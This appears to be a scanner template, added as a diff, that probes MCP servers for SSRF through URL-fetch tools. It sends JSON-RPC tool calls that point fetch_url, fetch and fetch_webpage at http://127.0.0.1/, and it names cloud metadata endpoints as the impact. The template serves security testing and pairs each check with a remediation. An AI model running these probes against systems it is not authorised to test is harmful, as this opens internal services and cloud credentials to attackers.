@@ -1,0 +1,160 @@
+id: mcp-ssrf-001-fetch-url-ssrf
+transport: mcp
+info:
+  name: "MCP Server - SSRF via URL Fetch Tool"
+  type: exploit
+  severity: high
+  author: aipostex
+  description: |
+    MCP server exposes a URL fetching tool (fetch_url, fetch, fetch_webpage,
+    or http_request) that accepts arbitrary URLs without validating against
+    private IP ranges. An attacker can use this to reach internal services,
+    cloud metadata endpoints (169.254.169.254), and other resources not
+    directly accessible from the network.
+  reference:
+    - https://vulnerablemcp.info/
+    - https://security.snyk.io/vuln/SNYK-JS-MCPFETCHSERVER-14287685
+  tags: [mcp, ssrf]
+  classification:
+    mitre-atlas: [AML.T0049]
+
+detect:
+  - method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(fetch_url|fetch_webpage|http_request|\"fetch\")"
+
+checks:
+  - name: "URL fetch tool available"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(fetch_url|fetch_webpage|http_request|\"fetch\")"
+    extractors:
+      - type: json
+        name: tool_names
+        path: "result.tools.#.name"
+    severity: medium
+    stage: access
+    landed: reachable
+    finding:
+      title: "MCP Server Exposes URL Fetch Tool"
+      description: "MCP server exposes a URL fetch tool among: {{tool_names}}. Without private IP validation, this enables SSRF."
+      remediation: "Implement URL validation that blocks private IP ranges, link-local addresses, and cloud metadata endpoints."
+
+  - name: "fetch_url accepts localhost request (no private-IP block)"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"http://127.0.0.1/"}},"id":2}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "\"error\""
+      - type: body_not_contains
+        value: "blocked"
+      - type: body_not_contains
+        value: "private"
+      - type: body_not_contains
+        value: "not allowed"
+      - type: body_not_contains
+        value: "Fetch error"
+      - type: body_not_contains
+        value: "refused"
+      - type: body_not_contains
+        value: "timed out"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "MCP fetch_url: Localhost Request Not Blocked (SSRF-enabling)"
+      description: "The fetch_url tool accepted a request to http://127.0.0.1/ and returned no private-IP/error block. This proves the tool does not block loopback targets (SSRF-enabling); it does not by itself prove fetched loopback content was returned."
+      remediation: "Implement URL validation that blocks requests to private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local addresses (169.254.0.0/16)."
+      evidence: |
+        Payload:  tools/call fetch_url {"url":"http://127.0.0.1/"}
+        Result:   Request accepted — no private IP blocking
+        Impact:   SSRF to internal services, cloud metadata (169.254.169.254)
+
+  - name: "fetch accepts localhost request (no private-IP block)"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch","arguments":{"url":"http://127.0.0.1/"}},"id":3}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "\"error\""
+      - type: body_not_contains
+        value: "blocked"
+      - type: body_not_contains
+        value: "private"
+      - type: body_not_contains
+        value: "not allowed"
+      - type: body_not_contains
+        value: "Fetch error"
+      - type: body_not_contains
+        value: "refused"
+      - type: body_not_contains
+        value: "timed out"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "MCP fetch: Localhost Request Not Blocked (SSRF-enabling)"
+      description: "The fetch tool accepted a request to http://127.0.0.1/ and returned no private-IP/error block, proving loopback targets are not blocked (SSRF-enabling)."
+      remediation: "Implement URL validation that blocks requests to private IP ranges and link-local addresses."
+      evidence: |
+        Payload:  tools/call fetch {"url":"http://127.0.0.1/"}
+        Result:   Request accepted — no private IP blocking
+        Impact:   SSRF to internal services and cloud metadata endpoints
+
+  - name: "fetch_webpage accepts localhost request (no private-IP block)"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch_webpage","arguments":{"url":"http://127.0.0.1/"}},"id":4}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "\"error\""
+      - type: body_not_contains
+        value: "blocked"
+      - type: body_not_contains
+        value: "private"
+      - type: body_not_contains
+        value: "not allowed"
+      - type: body_not_contains
+        value: "Fetch error"
+      - type: body_not_contains
+        value: "refused"
+      - type: body_not_contains
+        value: "timed out"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "MCP fetch_webpage: Localhost Request Not Blocked (SSRF-enabling)"
+      description: "The fetch_webpage tool accepted a request to http://127.0.0.1/ and returned no private-IP/error block, proving loopback targets are not blocked (SSRF-enabling)."
+      remediation: "Implement URL validation that blocks requests to private IP ranges and link-local addresses."
+      evidence: |
+        Payload:  tools/call fetch_webpage {"url":"http://127.0.0.1/"}
+        Result:   Request accepted — no private IP blocking
+        Impact:   SSRF to internal services and cloud metadata endpoints
